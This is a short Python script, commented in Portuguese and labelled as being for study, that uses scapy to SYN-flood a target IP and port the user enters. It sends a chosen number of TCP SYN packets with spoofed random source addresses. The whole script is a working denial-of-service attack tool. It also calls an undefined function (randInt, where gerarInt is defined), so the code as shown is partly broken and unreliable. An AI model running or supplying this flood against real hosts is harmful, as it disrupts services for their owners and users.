# Script com finalidade de estudos
# Syn Flood Packets
##################################

from scapy.all import *
import os
import sys
import random

def gerarIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def gerarInt():
	x = random.randint(1000,9000)
	return x	

def SYN_Atack(ipDestino,portDestino,counter):
	total = 0
	print ("Enviando Pacotes ...")
	for x in range (0,counter):
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()

		IP_Packet = IP ()
		IP_Packet.src = gerarIP()
		IP_Packet.dst = ipDestino

		TCP_Packet = TCP ()	
		TCP_Packet.sport = s_port
		TCP_Packet.dport = portDestino
		TCP_Packet.flags = "S"
		TCP_Packet.seq = s_eq
		TCP_Packet.window = w_indow

		send(IP_Packet/TCP_Packet, verbose=0)
		total+=1
	sys.stdout.write("\nTotal pacotes enviados: %i\n" % total)


def info():
	os.system("clear")
	print ("##"*17)
	print ("#        Finalidade Estudo             #")
	print ("#     Syn Flood Packets            #")
	print ("##"*17)

	ipDestino = input ("\nIP do Alvo : ")
	portDestino = input ("Porta do Alvo : ")
	
	return ipDestino,int(portDestino)
	

def main():
	ipDestino,portDestino = info()
	counter = input ("Quantos pacotes você quer enviar : ")
	SYN_Atack(ipDestino,portDestino,int(counter))

main()
